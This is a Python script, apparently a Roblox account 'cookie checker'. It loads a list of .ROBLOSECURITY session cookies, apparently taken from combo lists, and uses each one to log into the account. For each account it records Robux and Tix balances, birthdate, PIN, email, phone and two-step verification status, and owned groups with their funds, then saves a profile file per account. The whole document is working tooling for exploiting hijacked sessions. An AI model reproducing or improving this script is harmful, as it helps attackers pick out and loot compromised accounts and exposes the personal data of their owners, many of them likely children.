import string
import time
import requests
import random
from threading import Thread
import json
from datetime import date

cookies = [line for line in list(set(open("cookies.txt", encoding="UTF-8", errors="ignore").read().splitlines()))]

used = 0
Userid = 681274931 #Change this to your user ids
added = 0
current_year = 2019#change this to current year

for x in cookies:
                try:
                                combo,cookie = x.split(":_")
                                cookie = str("_"+cookie)
                except ValueError:
                                cookie = x
                with requests.Session() as (c):
                                used += 1
                                c.cookies['.ROBLOSECURITY'] = cookie
                                try:
                                                req = c.get("http://www.roblox.com/mobileapi/userinfo",allow_redirects=False).json()
                                                working = True
                                except(json.decoder.JSONDecodeError):
                                                print("Invalid Cookie")
                                                working  =  False
                                try:
                                                if working is True:
                                                                username = req['UserName']
                                                                userid = req['UserID']
                                                                RobuxBalance = req['RobuxBalance']
                                                                TixBalance = req['TicketsBalance']
                                                                IsAnyBuildersClubMember = req['IsAnyBuildersClubMember']
                                                                pinenabled = (c.get("https://auth.roblox.com/v1/account/pin").json()['isEnabled'])
                                                                phone = (c.get("https://accountsettings.roblox.com/v1/privacy/info").json()['isPhoneDiscoveryEnabled'])
                                                                twostep = (c.get("https://accountsettings.roblox.com/v2/twostepverification").json()['enabled'])
                                                                email = (c.get("https://accountsettings.roblox.com/v1/email").json()['verified'])
                                                                birthyear = (c.get("https://web.roblox.com/account/settings/birthdate").json()['BirthYear'])
                                                                birthdate = (c.get("https://web.roblox.com/account/settings/birthdate").json()['BirthDay'])
                                                                birthmonth = (c.get("https://web.roblox.com/account/settings/birthdate").json()['BirthMonth'])
                                                                groups = c.get(f"https://web.roblox.com/users/profile/playergroups-json?userId={userid}").json()
                                                                total_groups = groups['NumberOfGroups']
                                                                current_group = 0

                                except requests.ConnectionError:
                                                print("Error")
                                if working is True:
                                                save = open(f"Accounts\{username}.txt","a")
                                                save.write("---------------------------BASIC---------------------------\n")
                                                save.write(f"Username : {username} \n")
                                                save.write(f"ID : {userid} \n")
                                                save.write(f"Robux : {RobuxBalance} \n")
                                                save.write(f"Tix : {TixBalance} \n")
                                                save.write(f"BC/TBC/OBC : {IsAnyBuildersClubMember} \n")
                                                save.write(f"BirthDate : {birthdate}-{birthmonth}-{birthyear} \n")
                                                save.write("---------------------------Security---------------------------\n")
                                                save.write(f"Pin Enabled : {pinenabled} \n")
                                                save.write(f"Email Verified : {email} \n")
                                                save.write(f"Phone Verified : {phone} \n")
                                                save.write(f"2Step : {twostep} \n")
                                                save.write("---------------------------Groups---------------------------\n")
                                                while True:
                                                                if current_group is total_groups:
                                                                                break
                                                                else:
                                                                                groupid = groups['Groups'][current_group]['Id']
                                                                                groupname = (c.get(f'https://groups.roblox.com/v1/groups/{groupid}').json()['name'])
                                                                                try:
                                                                                                groupowner = (c.get(f'https://groups.roblox.com/v1/groups/{groupid}').json()['owner'])
                                                                                except(UnicodeEncodeError):
                                                                                                groupowner = "No One"
                                                                                try:
                                                                                                groupownerid = groupowner['userId']
                                                                                except(TypeError):
                                                                                                groupowner = "0"
                                                                                if groupownerid is userid:
                                                                                                Owner = "True"
                                                                                else:
                                                                                                Owner = "False"
                                                                                try:
                                                                                                funds = (requests.get(f'https://economy.roblox.com/v1/groups/{groupid}/currency').json()['robux'])
                                                                                except KeyError:
                                                                                               funds = "Private!"
                                                                                try:
                                                                                                save.write(f"Group Name : {groupname} \n")
                                                                                except(UnicodeEncodeError):
                                                                                                save.write(f"Group Name : Error! \n")
                                                                                save.write(f"Group Funds : {funds} \n")
                                                                                save.write(f"Owner : {Owner} \n")
                                                                                save.write(f"Group Link : https://web.roblox.com/groups/{groupid} \n")
                                                                                save.write("------------------------------------------------------\n")
                                                                                current_group += 1
                                                                


                                                                
                                                
                                
                                
                                
                                
